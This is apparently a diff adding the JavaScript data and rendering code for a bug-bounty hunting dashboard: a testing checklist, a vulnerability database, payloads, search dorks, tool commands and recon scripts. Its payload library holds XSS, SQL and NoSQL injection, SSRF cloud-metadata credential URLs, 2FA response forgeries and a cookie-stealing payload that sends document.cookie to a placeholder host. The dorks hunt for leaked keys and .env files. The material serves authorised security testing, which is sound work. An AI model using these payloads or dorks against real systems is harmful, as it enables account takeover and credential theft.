+var ST = { checks: load('checks',{}), reports: load('reports',[]), target: load('target','') };
+
+// ── TEXT NODE HELPER ─────────────────────────
+function el(tag, cls, txt) {
+  var e = document.createElement(tag);
+  if (cls) e.className = cls;
+  if (txt !== undefined) e.textContent = txt;
+  return e;
+}
+function div(cls, txt) { return el('div', cls, txt); }
+function span(cls, txt) { return el('span', cls, txt); }
+
+// ── DATA ─────────────────────────────────────
+// All payload/dork values stored as plain text arrays — rendered via textContent only
+
+var CL = [
+  {id:'r1',c:'recon',t:'Read full program scope and rules before touching anything',m:'STEP 0',s:'info'},
+  {id:'r2',c:'recon',t:'Run subfinder on all target domains',m:'passive',s:'info'},
+  {id:'r3',c:'recon',t:'Run assetfinder and amass for additional subdomains',m:'passive',s:'info'},
+  {id:'r4',c:'recon',t:'Check crt.sh certificate transparency logs',m:'passive',s:'info'},
+  {id:'r5',c:'recon',t:'Probe live hosts: cat subs.txt | httpx -mc 200,403',m:'active',s:'info'},
+  {id:'r6',c:'recon',t:'Extract wayback URLs with waybackurls',m:'active',s:'info'},
+  {id:'r7',c:'recon',t:'Find JS files and scan with nuclei exposures templates',m:'active',s:'medium'},
+  {id:'r8',c:'recon',t:'Search GitHub dorks for hardcoded secrets and credentials',m:'passive',s:'high'},
+  {id:'r9',c:'recon',t:'Run Shodan/FOFA SSL cert matching',m:'passive',s:'medium'},
+  {id:'r10',c:'recon',t:'Check Postman documenter for leaked API collections',m:'passive',s:'medium'},
+  {id:'r11',c:'recon',t:'Fingerprint tech stack with Wappalyzer and httpx -tech-detect',m:'active',s:'info'},
+  {id:'r12',c:'recon',t:'Collect and sort unique parameters from all discovered URLs',m:'active',s:'medium'},
+  {id:'a1',c:'auth',t:'Test 2FA bypass via response manipulation (200 OK + success body)',m:'HIGH PRIORITY',s:'critical'},
+  {id:'a2',c:'auth',t:'Test OTP reuse — submit same valid OTP a second time',m:'auth',s:'high'},
+  {id:'a3',c:'auth',t:'Test missing rate limit on OTP/password reset via Accept-Language variation',m:'rate-limit',s:'medium'},
+  {id:'a4',c:'auth',t:"Test SQL injection on login: admin'--  and ' OR 1=1 --",m:'sqli',s:'critical'},
+  {id:'a5',c:'auth',t:'Test NoSQL injection: send {"$ne":null} in JSON login fields',m:'nosqli',s:'high'},
+  {id:'a6',c:'auth',t:'Test login response manipulation: change 401 to 200',m:'response',s:'high'},
+  {id:'a7',c:'auth',t:'Test default credentials: admin/admin, admin/password, admin/123456',m:'basics',s:'high'},
+  {id:'a8',c:'auth',t:'Test password reset link reuse and token non-expiry',m:'tokens',s:'medium'},
+  {id:'a9',c:'auth',t:'Test email sub-addressing bypass: user+1@domain.com on rate-limited endpoints',m:'rate-limit',s:'medium'},
+  {id:'a10',c:'auth',t:'Test registration with role parameter injection: isAdmin:true in POST body',m:'authz',s:'high'},
+  {id:'a11',c:'auth',t:'Test duplicate registration and email case variation',m:'logic',s:'medium'},
+  {id:'a12',c:'auth',t:'Test email change workflow for authentication bypass',m:'critical path',s:'high'},
+  {id:'a13',c:'auth',t:'Test invite code reuse and predictable code patterns',m:'registration',s:'medium'},
+  {id:'s1',c:'session',t:'Test session fixation: use pre-auth session ID after login',m:'session',s:'high'},
+  {id:'s2',c:'session',t:'Analyze session tokens for entropy using Burp Sequencer',m:'session',s:'medium'},
+  {id:'s3',c:'session',t:'Check if session token appears in URLs or Referer headers',m:'session',s:'medium'},
+  {id:'s4',c:'session',t:'Test session not invalidated after logout',m:'session',s:'medium'},
+  {id:'s5',c:'session',t:'Test JWT with algorithm set to none in header',m:'jwt',s:'critical'},
+  {id:'s6',c:'session',t:'Test JWT payload manipulation: change email/role and re-sign',m:'jwt',s:'high'},
+  {id:'s7',c:'session',t:'Test remember-me token for predictable patterns',m:'session',s:'medium'},
+  {id:'s8',c:'session',t:'Check Cache-Control: no-store on sensitive API responses',m:'caching',s:'low'},
+  {id:'x1',c:'xss',t:'Test reflected XSS on all query parameters',m:'xss',s:'medium'},
+  {id:'x2',c:'xss',t:'Test stored XSS in comments, profile fields, user-supplied inputs',m:'xss',s:'high'},
+  {id:'x3',c:'xss',t:'Test DOM XSS via URL hash fragment and search parameters',m:'dom-xss',s:'medium'},
+  {id:'x4',c:'xss',t:'Test XSS in HTTP headers: X-Forwarded-For, Referer, User-Agent',m:'header-xss',s:'medium'},
+  {id:'x5',c:'xss',t:'Test XSS filter bypass: uppercase tags, double encoding, SVG/IMG onerror',m:'bypass',s:'medium'},
+  {id:'x6',c:'xss',t:'Confirm cookie disclosure via XSS payload',m:'impact',s:'medium'},
+  {id:'x7',c:'xss',t:'Check for Content-Security-Policy header presence and strength',m:'headers',s:'low'},
+  {id:'ss1',c:'ssrf',t:'Identify URL-fetching parameters: url=, proxy=, redirect=, host=, img=',m:'detect',s:'high'},
+  {id:'ss2',c:'ssrf',t:'Test SSRF to http://127.0.0.1 and alternate forms',m:'internal',s:'high'},
+  {id:'ss3',c:'ssrf',t:'Test SSRF to AWS metadata: http://169.254.169.254/latest/meta-data/',m:'cloud',s:'critical'},
+  {id:'ss4',c:'ssrf',t:'Test SSRF with Burp Collaborator for out-of-band detection',m:'blind',s:'high'},
+  {id:'ss5',c:'ssrf',t:'Test internal port scanning via SSRF: response time differences',m:'portscan',s:'high'},
+  {id:'ss6',c:'ssrf',t:'Test SSRF whitelist bypass using @ and # character tricks',m:'bypass',s:'high'},
+  {id:'ss7',c:'ssrf',t:'Test SSRF in image upload URL, webhook, link preview features',m:'features',s:'high'},
+  {id:'id1',c:'idor',t:'Replace user IDs in API calls with another user ID',m:'horizontal',s:'high'},
+  {id:'id2',c:'idor',t:'Test IDOR in object references: order ID, invoice, ticket',m:'objects',s:'high'},
+  {id:'id3',c:'idor',t:'Test UUID predictability or sequential ID enumeration',m:'id-guess',s:'medium'},
+  {id:'id4',c:'idor',t:'Test IDOR in file download and export endpoints',m:'files',s:'high'},
+  {id:'id5',c:'idor',t:'Test GraphQL queries for unauthorized object access by ID',m:'graphql',s:'high'},
+  {id:'ap1',c:'api',t:'Test unauthenticated API access: remove Authorization header entirely',m:'auth',s:'high'},
+  {id:'ap2',c:'api',t:'Test mass assignment: send extra fields in POST body (role, isAdmin)',m:'mass-assign',s:'high'},
+  {id:'ap3',c:'api',t:'Test deprecated API versions: /api/v1 when /api/v2 is current',m:'versioning',s:'medium'},
+  {id:'ap4',c:'api',t:'Test API rate limiting on login, OTP, password reset endpoints',m:'rate-limit',s:'medium'},
+  {id:'ap5',c:'api',t:'Test GraphQL introspection enabled in production',m:'graphql',s:'medium'},
+  {id:'ap6',c:'api',t:'Test for API keys exposed in JS files and error pages',m:'recon',s:'high'},
+  {id:'ap7',c:'api',t:'Test CORS misconfiguration: null origin with credentials',m:'cors',s:'medium'},
+  {id:'ap8',c:'api',t:'Test HTTP method switching: GET to DELETE/PATCH on same endpoint',m:'methods',s:'medium'},
+  {id:'b1',c:'business',t:'Test negative quantity or price in cart/purchase flow',m:'logic',s:'high'},
+  {id:'b2',c:'business',t:'Test coupon/discount code stacking or unlimited reuse',m:'logic',s:'medium'},
+  {id:'b3',c:'business',t:'Test race condition on reward or point redemption',m:'race',s:'high'},
+  {id:'b4',c:'business',t:'Test unauthorized state transition: skip workflow steps',m:'workflow',s:'high'},
+  {id:'b5',c:'business',t:'Test missing server-side rate limit on forms (report, resume, contact)',m:'dos',s:'medium'},
+  {id:'f1',c:'upload',t:'Test file upload accepting .php/.jsp disguised as image',m:'rce-path',s:'critical'},
+  {id:'f2',c:'upload',t:'Test MIME type bypass: change Content-Type to image/jpeg for .php',m:'bypass',s:'high'},
+  {id:'f3',c:'upload',t:'Test path traversal in filename: ../../../etc/passwd',m:'lfi',s:'high'},
+  {id:'f4',c:'upload',t:'Test SVG file upload for stored XSS via embedded script',m:'xss',s:'medium'},
+  {id:'f5',c:'upload',t:'Test XML file upload for XXE injection',m:'xxe',s:'high'}
+];
+
+var VULNS = [
+  {id:'v1',n:'2FA/MFA Bypass via Response Manipulation',s:'critical',
+   desc:'The app determines 2FA success by trusting the HTTP response body. Intercepting and modifying a failed OTP response to show success grants access without knowing the 2FA code.',
+   steps:['Login with valid credentials, reach 2FA page','Enter any wrong OTP and click submit','Burp: Right-click → Do Intercept → Response to this request','Change HTTP status to 200 OK','Replace response body with: {"success":true}','Forward — check if authenticated session is granted'],
+   impact:'Full account takeover without 2FA code.',owasp:'A07:2021',cwe:'CWE-603',cvss:'8.1'},
+  {id:'v2',n:'SSRF via URL Parameter',s:'high',
+   desc:'Endpoints accepting user-supplied URLs for content fetching can be abused to make the server request internal infrastructure or cloud metadata services.',
+   steps:['Find params: url=, proxy=, redirect=, page=, img=, host=','Replace value with http://127.0.0.1','Test http://169.254.169.254/latest/meta-data/ for AWS creds','Use Burp Collaborator for blind SSRF','Measure response time differences for port scanning'],
+   impact:'Internal network access, cloud credential theft, potential RCE.',owasp:'A10:2021',cwe:'CWE-918',cvss:'7.5'},
+  {id:'v3',n:'IDOR — Insecure Direct Object Reference',s:'high',
+   desc:'Application exposes internal object IDs in API endpoints without verifying ownership. Attacker modifies IDs to access other users data.',
+   steps:["Login as User A, note all object IDs in API calls",'Login as User B in another session','Replay User A requests with User B session token','Increment or change object ID — observe if data returned'],
+   impact:'Access to other users PII, financial records, private documents.',owasp:'A01:2021',cwe:'CWE-639',cvss:'7.5'},
+  {id:'v4',n:'Reflected XSS',s:'medium',
+   desc:'User input reflected in HTTP response without encoding. Attacker crafts URL causing victim browser to execute arbitrary JavaScript in target origin.',
+   steps:['Find parameters that reflect user input in HTML response','Inject a test marker to confirm reflection','Test XSS using img onerror or svg onload attributes','Test filter bypass if basic payload is blocked','Confirm with document.cookie disclosure'],
+   impact:'Session hijacking, credential theft, defacement.',owasp:'A03:2021',cwe:'CWE-79',cvss:'6.1'},
+  {id:'v5',n:'SQL Injection',s:'critical',
+   desc:'User input concatenated directly into SQL queries. Enables authentication bypass, data extraction, or OS command execution.',
+   steps:["Test login with single quote: admin'--",'Test: OR with always-true condition','Use sqlmap for automated detection','Test time-based blind via SLEEP function'],
+   impact:'Auth bypass, full database exfiltration, potential OS RCE.',owasp:'A03:2021',cwe:'CWE-89',cvss:'9.8'},
+  {id:'v6',n:'JWT Algorithm Confusion',s:'critical',
+   desc:'JWT library accepts alg:none or allows RS256/HS256 confusion, enabling forged tokens that bypass signature verification.',
+   steps:['Decode JWT and inspect the alg field','Modify alg to none and remove signature (keep trailing dot)','Forward modified token and check if accepted','Test HS256 with RS256 public key as HMAC secret'],
+   impact:'Full auth bypass, impersonate any user including admins.',owasp:'A02:2021',cwe:'CWE-347',cvss:'9.1'},
+  {id:'v7',n:'Rate Limiting Bypass via Headers',s:'medium',
+   desc:'Rate limits tracked by IP can be evaded by rotating X-Forwarded-For, varying Accept-Language, or using email sub-addressing.',
+   steps:['Find a rate-limited endpoint (login, OTP, reset)','Add X-Forwarded-For: 1.2.3.{n} and iterate in Intruder','Vary Accept-Language header per request','For email limits: user+1@domain.com, user+2@domain.com'],
+   impact:'OTP brute force, credential stuffing, password reset flooding.',owasp:'A05:2021',cwe:'CWE-307',cvss:'5.3'},
+  {id:'v8',n:'Business Logic — Missing Rate Limit on Forms',s:'medium',
+   desc:'High-cost server operations lack rate limiting. Attackers flood the endpoint causing resource exhaustion.',
+   steps:['Find upload/report/invite form','Capture in Burp and send to Intruder','Send 100+ requests iterating a minor parameter','Observe all requests succeed with no limit'],
+   impact:'Storage exhaustion, memory DoS, email system abuse.',owasp:'A04:2021',cwe:'CWE-770',cvss:'5.3'},
+  {id:'v9',n:'Admin Invitation Token Hijacking',s:'high',
+   desc:'Low-priv users can call invite token generation endpoints with their own token + tenant ID, retrieving admin invitation links.',
+   steps:['Login as low-priv user, capture Bearer token and tenant-id','Call /api/invite_codes/tenant/{tenant-id} with low-priv token','If codes returned, register new account with the code','Check if resulting account has elevated privileges'],
+   impact:'Any authenticated user can escalate to administrator.',owasp:'A01:2021',cwe:'CWE-639',cvss:'8.8'},
+  {id:'v10',n:'Hardcoded Credentials in Public GitHub',s:'high',
+   desc:'Developers accidentally commit API keys, passwords, tokens to public repos that can be found via GitHub search.',
+   steps:['Search: "target.com" api_key OR password on GitHub','Search: filename:.env "target.com"','Scan JS files with TruffleHog Chrome extension','Validate found key via a safe read-only API call'],
+   impact:'Unauthorized cloud infrastructure, database, third-party service access.',owasp:'A02:2021',cwe:'CWE-798',cvss:'7.5'}
+];
+
+// Payloads stored as plain text — no HTML tags in the data
+var PAYLOADS = [
+  {t:'xss',l:'Basic script tag',v:'<script>alert(document.domain)<\/script>'},
+  {t:'xss',l:'IMG onerror',v:'<img src=x onerror=alert(document.domain)>'},
+  {t:'xss',l:'SVG onload',v:'<svg onload=alert(1)>'},
+  {t:'xss',l:'Uppercase bypass',v:'<IMG SRC=x ONERROR=alert(1)>'},
+  {t:'xss',l:'Double URL encode',v:'%253Cscript%253Ealert(1)%253C%2Fscript%253E'},
+  {t:'xss',l:'Cookie stealer (replace COLLAB)',v:'<img src=x onerror=fetch("https://COLLAB/?c="+document.cookie)>'},
+  {t:'sqli',l:'Auth bypass',v:"' OR '1'='1' --"},
+  {t:'sqli',l:'Admin comment',v:"admin'--"},
+  {t:'sqli',l:'Always true OR',v:"' OR 1=1 --"},
+  {t:'sqli',l:'Time-based blind MySQL',v:"' AND SLEEP(5)--"},
+  {t:'sqli',l:'UNION 2 columns',v:"' UNION SELECT null,null--"},
+  {t:'sqli',l:'NoSQL ne operator',v:'{"$ne": null}'},
+  {t:'sqli',l:'NoSQL gt operator',v:'{"$gt": ""}'},
+  {t:'ssrf',l:'Localhost',v:'http://127.0.0.1'},
+  {t:'ssrf',l:'Localhost short',v:'http://127.1'},
+  {t:'ssrf',l:'IPv6 localhost',v:'http://[::1]'},
+  {t:'ssrf',l:'Zero IP',v:'http://0.0.0.0'},
+  {t:'ssrf',l:'AWS metadata root',v:'http://169.254.169.254/latest/meta-data/'},
+  {t:'ssrf',l:'AWS IAM credentials',v:'http://169.254.169.254/latest/meta-data/iam/security-credentials/'},
+  {t:'ssrf',l:'GCP metadata',v:'http://metadata.google.internal/computeMetadata/v1/'},
+  {t:'ssrf',l:'Whitelist bypass @',v:'http://trusted.com@169.254.169.254/'},
+  {t:'ssrf',l:'Whitelist bypass #',v:'http://trusted.com#@169.254.169.254/'},
+  {t:'2fa',l:'Success boolean',v:'{"success":true}'},
+  {t:'2fa',l:'Success string',v:'{"success":"true"}'},
+  {t:'2fa',l:'IsValid 1',v:'{"isValid":1}'},
+  {t:'2fa',l:'Status true',v:'{"status":"true"}'},
+  {t:'2fa',l:'Verified true',v:'{"verified":true}'},
+  {t:'2fa',l:'Message success',v:'{"message":"success"}'},
+  {t:'header',l:'IP spoof XFF',v:'X-Forwarded-For: 127.0.0.1'},
+  {t:'header',l:'IP spoof X-Real-IP',v:'X-Real-IP: 127.0.0.1'},
+  {t:'header',l:'Rate limit vary',v:'Accept-Language: en-US-{n}'},
+  {t:'header',l:'Host injection',v:'Host: evil.attacker.com'},
+  {t:'header',l:'Referer spoof',v:'Referer: https://admin.target.com'},
+  {t:'header',l:'X-Custom-IP',v:'X-Custom-IP-Authorization: 127.0.0.1'}
+];
+
+var DORKS = [
+  {c:'github',l:'API key',v:'"{target}" api_key'},
+  {c:'github',l:'Password',v:'"{target}" password'},
+  {c:'github',l:'Secret key',v:'"{target}" secret_key'},
+  {c:'github',l:'AWS access key',v:'"{target}" aws_access_key_id'},
+  {c:'github',l:'JWT token',v:'"{target}" jwt OR token'},
+  {c:'github',l:'Employee email',v:'"@{target}.com"'},
+  {c:'github',l:'DB JDBC string',v:'"{target}" jdbc password'},
+  {c:'github',l:'RSA private key',v:'"{target}" BEGIN RSA PRIVATE KEY'},
+  {c:'github',l:'Firebase config',v:'"{target}" firebase apiKey'},
+  {c:'github',l:'.env file',v:'filename:.env "{target}"'},
+  {c:'github',l:'id_rsa file',v:'filename:id_rsa "{target}"'},
+  {c:'github',l:'wp-config',v:'filename:wp-config.php "{target}"'},
+  {c:'github',l:'sftp-config',v:'filename:sftp-config.json "{target}"'},
+  {c:'google',l:'Subdomains',v:'site:{target} -www'},
+  {c:'google',l:'Login pages',v:'site:{target} inurl:login OR inurl:signin'},
+  {c:'google',l:'Exposed files',v:'site:{target} filetype:pdf OR filetype:xlsx OR filetype:env'},
+  {c:'google',l:'Admin panels',v:'site:{target} inurl:admin OR inurl:dashboard'},
+  {c:'google',l:'Config files',v:'site:{target} filetype:xml OR filetype:conf OR filetype:bak'},
+  {c:'google',l:'SQL errors',v:'site:{target} "sql syntax" OR "mysql error"'},
+  {c:'google',l:'Staging servers',v:'site:{target} inurl:dev OR inurl:staging OR inurl:test'},
+  {c:'shodan',l:'SSL cert match',v:'ssl.cert.subject.cn:{target} port:443'},
+  {c:'shodan',l:'200 OK live',v:'ssl.cert.subject.cn:{target} port:443 +200'},
+  {c:'shodan',l:'Open ports',v:'org:"{target}" port:8080,8443,9200'},
+  {c:'shodan',l:'Jenkins exposed',v:'org:"{target}" "x-jenkins" http.status:200'},
+  {c:'fofa',l:'Domain assets',v:'domain="{target}"'},
+  {c:'fofa',l:'Title match',v:'title="{target}"'},
+  {c:'fofa',l:'Cert match',v:'cert="{target}"'},
+  {c:'postman',l:'API documenter',v:'site:documenter.getpostman.com "{target}"'},
+  {c:'postman',l:'Postman workspace',v:'site:postman.com "{target}" api'},
+  {c:'postman',l:'SwaggerHub',v:'site:app.swaggerhub.com "{target}"'}
+];
+
+var TOOLS = [
+  {icon:'🔍',n:'subfinder',d:'Passive subdomain enumeration from 40+ sources',usage:'subfinder -d target.com -o subs.txt',install:'go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest'},
+  {icon:'🌐',n:'httpx',d:'Probe alive hosts, detect tech stack, status codes',usage:'cat subs.txt | httpx -mc 200,403 -tech-detect',install:'go install github.com/projectdiscovery/httpx/cmd/httpx@latest'},
+  {icon:'📜',n:'waybackurls',d:'Extract archived URLs from Wayback Machine',usage:'echo target.com | waybackurls | tee wb.txt',install:'go install github.com/tomnomnom/waybackurls@latest'},
+  {icon:'⚡',n:'nuclei',d:'Template-based vuln scanner with 8000+ templates',usage:'nuclei -l urls.txt -t exposures/ -s medium,high',install:'go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest'},
+  {icon:'🎯',n:'gf',d:'Grep patterns to find interesting parameters in URL lists',usage:'cat wb.txt | gf ssrf | tee ssrf.txt',install:'go install github.com/tomnomnom/gf@latest'},
+  {icon:'💣',n:'ffuf',d:'Fast web fuzzer for directories, parameters, vhosts',usage:'ffuf -c -w wordlist.txt -u https://target.com/FUZZ -mc 200',install:'go install github.com/ffuf/ffuf/v2@latest'},
+  {icon:'🐍',n:'sqlmap',d:'Automated SQL injection detection and exploitation',usage:'python3 sqlmap.py -u "https://target.com/api?id=1" --dbs',install:'git clone https://github.com/sqlmapproject/sqlmap.git'},
+  {icon:'🦊',n:'gau',d:'Fetch known URLs from multiple crawlers (Wayback, OTX, URLScan)',usage:'cat subs.txt | gau --providers wayback,commoncrawl,otx,urlscan',install:'go install github.com/lc/gau/v2/cmd/gau@latest'},
+  {icon:'🎯',n:'dalfox',d:'XSS scanner with parameter analysis and blind XSS support',usage:'dalfox url https://target.com/search?q=test',install:'go install github.com/hahwul/dalfox/v2@latest'},
+  {icon:'🔑',n:'trufflehog',d:'Find credentials and secrets in git repositories',usage:'trufflehog github --org=target-org',install:'pip3 install trufflehog --break-system-packages'},
+  {icon:'📡',n:'naabu',d:'Fast port scanner optimized for bug bounty recon',usage:'naabu -host target.com -top-ports 1000',install:'go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest'},
+  {icon:'🔧',n:'qsreplace',d:'Replace query string values in bulk for SSRF testing',usage:'cat urls.txt | gf ssrf | qsreplace http://169.254.169.254',install:'go install github.com/tomnomnom/qsreplace@latest'},
+  {icon:'🏹',n:'reconftw',d:'Automated full recon framework combining all tools',usage:'./reconftw.sh -d target.com -r',install:'git clone https://github.com/six2dez/reconftw && ./install.sh'},
+  {icon:'💡',n:'amass',d:'Advanced asset discovery and subdomain enumeration',usage:'amass enum -passive -d target.com',install:'go install github.com/owasp-amass/amass/v4/...@latest'}
+];
+
+var ARTICLES = [
+  {c:'ssrf',title:'SSRF Detection & Exploitation',desc:'URL params, image fetching, webhooks. Cloud metadata, port scanning, WAF bypass via @ and # tricks.',meta:'Source: SSRF.txt + SSRF Paper'},
+  {c:'auth',title:'Authentication Bug Checklist',desc:'Registration flaws, login bypasses, session issues, MFA bypasses, OAuth vulns, rate limiting.',meta:'Source: AUTH CHECKLIST.pdf'},
+  {c:'auth',title:'2FA/MFA Bypass Techniques',desc:'Response manipulation, OTP reuse, timing attacks, TOTP interception. Real Burp PoC examples.',meta:'Source: 7oct-mfa-2fa-ssrf.txt'},
+  {c:'auth',title:'Password Reset Vulnerabilities',desc:'Token flaws, expiry issues, host header injection in reset emails, email change auth bypass.',meta:'Source: PASSWORD RESET AND AUTH.pdf'},
+  {c:'recon',title:'Bug Bounty 2026 Roadmap',desc:'Week-by-week learning path: web fundamentals, recon mastery, vuln hunting, reporting.',meta:'Source: BUG BOUNTY ROADMAP_CHECKLIST.pdf'},
+  {c:'recon',title:'Subdomain & JS File Recon',desc:'subfinder → httpx → waybackurls → JS extraction → nuclei exposures scan pipeline.',meta:'Source: Lec1-Sep16.txt + Lec2-Sep17.txt'},
+  {c:'api',title:'API Key Discovery & Exploitation',desc:'Find keys in JS files, GitHub, Postman. Validate safely. Firebase, Maps, AWS key testing.',meta:'Source: APIExploits.txt + GIthub-API-Exploit.txt'},
+  {c:'api',title:'Postman & API Dorking',desc:'site:documenter.getpostman.com dorking. Org-based GitHub searches. Real API collection exploitation.',meta:'Source: postman-PII-DORK.txt'},
+  {c:'business',title:'Business Logic Vulnerabilities',desc:'Rate limit missing, memory exhaustion, file upload abuse. DoS via unlimited form submissions.',meta:'Source: BusinessLogics.txt + BUSINESS LOGIC pdfs'},
+  {c:'recon',title:'GitHub Dorking — 500+ Dorks',desc:'Filename-based dorks for secrets, language-based credential searches, validating found keys.',meta:'Source: 500+ Github Dorks Guide.pdf'},
+  {c:'api',title:'Top 10 Bugs That Pay',desc:'Admin invite hijacking, JWT manipulation, SSRF via media fetch, N+1 data leakage, client-side enforcement.',meta:'Source: TOP 10 Bugs that Pay.pdf'},
+  {c:'recon',title:'FOFA & Shodan Dorking',desc:'FOFA operators: domain, cert, title. Shodan SSL cert queries, port searches, exposed services.',meta:'Source: 500+ FOFA DORKs Guide.pdf'}
+];
+
+var RECON_SCRIPTS = [
+  {title:'Full Recon Pipeline',desc:'Subdomain discovery to parameter extraction',
+   code:'subfinder -d target.com | httpx -mc 200,403 | tee subs.txt\n\ncat subs.txt | gau --providers wayback,commoncrawl,otx,urlscan | tee urls.txt\n\ncat urls.txt | grep ".js" | tee js.txt\nnuclei -l js.txt -t /root/nuclei-templates/http/exposures\n\ncat urls.txt | grep "=" | tee params.txt\n\ncat params.txt | grep -E "url=|proxy=|redirect=|host=|img=" | tee ssrf_cands.txt'},
+  {title:'SSRF Automation',desc:'SSRF candidates with Burp Collaborator',
+   code:'subfinder -d target.com | httpx | tee subs.txt\ncat subs.txt | waybackurls | tee data.txt\ncat data.txt | gf ssrf | tee ssrf.txt\n\ncat ssrf.txt | grep "=" | \\\n  qsreplace "https://YOUR_COLLAB.burpcollaborator.net" \\\n  | tee ssrf_test.txt\n\ncat data.txt | grep "=" | \\\n  qsreplace "http://169.254.169.254/latest/meta-data/"'},
+  {title:'GitHub Secrets Hunting',desc:'Find hardcoded credentials in public repos',
+   code:'# GitHub search queries\n"target.com" api_key\n"target.com" password\n"target.com" aws_access_key_id\n"@target.com" jwt\n\nfilename:.env "target.com"\nfilename:config.php "target.com" dbpasswd\n\n# Automated scan\ntrufflehog github --org=target-github-org'},
+  {title:'JS File Analysis',desc:'Extract secrets and endpoints from JavaScript',
+   code:'subfinder -d target.com | httpx -mc 200 | tee alive.txt\ncat alive.txt | gau | grep ".js" | httpx -mc 200 | tee js.txt\n\nnuclei -l js.txt -t exposures/tokens/\nnuclei -l js.txt -t exposures/apis/\n\ncat js.txt | xargs -I{} curl -s {} | \\\n  grep -iE "apikey|api_key|secret|password|token|firebase|aws_access"'},
+  {title:'Information Disclosure Hunt',desc:'Find leaked files and config data',
+   code:'cat wb.txt | grep -E "\\.(xlsx|pdf|xml|json|env|bak|conf|log|sql|zip)$" | tee files.txt\n\ncat wb.txt | grep -iE "config|password|jdbc|secret|firebase|backup|aws" | tee sensitive.txt\n\ncat files.txt | httpx -mc 200 | tee live_files.txt\ncat sensitive.txt | httpx -mc 200 | tee live_sensitive.txt'},
+  {title:'Alert on New Findings (Slack)',desc:'Continuous monitoring with Slack alerts',
+   code:'# Install slackcat\ngo get github.com/dwisiswant0/slackcat\n\n# Monitor new subdomains\nsubfinder -d target.com | httpx -sc -ct | \\\n  slackcat -u SLACK_WEBHOOK_URL\n\n# Nuclei CVE alerts\nnuclei -l urls.txt -t cves/ | slackcat -u SLACK_WEBHOOK_URL'}
+];
+
+// ── CHECKLIST RENDER ─────────────────────────
+var CAT_LABELS = {
+  recon:'RECON & DISCOVERY', auth:'AUTHENTICATION', session:'SESSION MANAGEMENT',
+  xss:'CROSS-SITE SCRIPTING', ssrf:'SERVER-SIDE REQUEST FORGERY',
+  idor:'IDOR / BROKEN ACCESS CONTROL', api:'API SECURITY',
+  business:'BUSINESS LOGIC', upload:'FILE UPLOAD'
+};
+var SEV_CLS = {critical:'bc',high:'bh',medium:'bm',low:'bl',info:'bi'};
+
+var clCat = 'all';
+
+function renderCL() {
+  var items = clCat === 'all' ? CL : CL.filter(function(i){return i.c===clCat;});
+  var done = items.filter(function(i){return ST.checks[i.id];}).length;
+  var pct = items.length ? Math.round(done/items.length*100) : 0;
+  document.getElementById('pbFill').style.width = pct+'%';
+  document.getElementById('pbLbl').textContent = done+' / '+items.length+' complete ('+pct+'%)';
+
+  var g = {};
+  items.forEach(function(i){if(!g[i.c])g[i.c]=[];g[i.c].push(i);});
+
+  var out = document.getElementById('clOut');
+  out.innerHTML = '';
+
+  Object.keys(g).forEach(function(cat) {
+    var its = g[cat];
+    var gDone = its.filter(function(i){return ST.checks[i.id];}).length;
+
+    var grp = div('clgrp');
+    var gtitle = div('clgtitle', (CAT_LABELS[cat]||cat.toUpperCase())+' — '+gDone+'/'+its.length);
+    grp.appendChild(gtitle);
+
+    its.forEach(function(item) {
+      var isDone = !!ST.checks[item.id];
+      var row = div('ci'+(isDone?' done':''));
+      row.onclick = function(){toggleCheck(item.id);};
+
+      var box = div('cib', isDone?'✓':'');
+      var label = span('cil', item.t);
+      var meta = span('cim', '['+item.m+']');
+      var badge = span('b '+SEV_CLS[item.s], item.s);
+
+      var right = div('');
+      right.style.cssText = 'flex:1;display:flex;align-items:center;gap:6px;flex-wrap:wrap';
+      right.appendChild(label);
+      right.appendChild(meta);
+      right.appendChild(badge);
+      row.appendChild(box);
+      row.appendChild(right);
+      grp.appendChild(row);
+    });
+    out.appendChild(grp);
+  });
+  updateStats();
+}
+
+function toggleCheck(id) {
+  ST.checks[id] = !ST.checks[id];
+  save('checks', ST.checks);
+  renderCL();
+}
+
+function resetCL() {
+  if(!confirm('Reset all checklist progress?')) return;
+  ST.checks = {};
+  save('checks', ST.checks);
+  renderCL();
+}
+
+document.querySelectorAll('#clChips .chip').forEach(function(c) {
+  c.addEventListener('click', function() {
+    document.querySelectorAll('#clChips .chip').forEach(function(x){x.classList.remove('on');});
+    c.classList.add('on');
+    clCat = c.dataset.c;
+    renderCL();
+  });
+});
+
+// ── VULN DB RENDER ───────────────────────────
+var vSev = 'all';
+
+function renderVulns() {
+  var items = vSev === 'all' ? VULNS : VULNS.filter(function(v){return v.s===vSev;});
+  var out = document.getElementById('vOut');
+  out.innerHTML = '';
+
+  items.forEach(function(v) {
+    var wrap = div('vacc');
+    var head = div('vacchead');
+
+    var name = span('vaccname', v.n);
+    var badges = div('');
+    badges.style.cssText = 'display:flex;gap:5px;flex-wrap:wrap;flex-shrink:0';
+    var b1 = span('b '+SEV_CLS[v.s], v.s.toUpperCase());
+    var b2 = span('b bl', 'CVSS '+v.cvss);
+    var b3 = span('b bi', v.cwe);
+    badges.appendChild(b1); badges.appendChild(b2); badges.appendChild(b3);
+
+    head.appendChild(name);
+    head.appendChild(badges);
+
+    var body = div('vaccbody');
+
+    var desc = div('vdesc', v.desc);
+
+    var sl = div('');
+    sl.style.cssText = 'font-family:"Courier New",monospace;font-size:10px;color:#00ff9d;margin:10px 0 4px';
+    sl.textContent = '// STEPS TO REPRODUCE';
+
+    var steps = document.createElement('ol');
+    steps.className = 'vsteps';
+    v.steps.forEach(function(s){
+      var li = el('li','',s);
+      steps.appendChild(li);
+    });
+
+    var il = div('');
+    il.style.cssText = 'font-family:"Courier New",monospace;font-size:10px;color:#ff2d6b;margin:8px 0 4px';
+    il.textContent = '// IMPACT';
+    var imp = div('vimp', v.impact);
+    var ow = div('');
+    ow.style.cssText = 'font-family:"Courier New",monospace;font-size:9px;color:#4a5568;margin-top:5px';
+    ow.textContent = v.owasp;
+
+    body.appendChild(desc);
+    body.appendChild(sl);
+    body.appendChild(steps);
+    body.appendChild(il);
+    body.appendChild(imp);
+    body.appendChild(ow);
+
+    head.onclick = function(){body.classList.toggle('open');};
+    wrap.appendChild(head);
+    wrap.appendChild(body);
+    out.appendChild(wrap);
+  });
+}
+
+document.querySelectorAll('#vChips .chip').forEach(function(c) {
+  c.addEventListener('click', function() {
+    document.querySelectorAll('#vChips .chip').forEach(function(x){x.classList.remove('on');});
+    c.classList.add('on');
+    vSev = c.dataset.v;
+    renderVulns();
+  });
+});
+
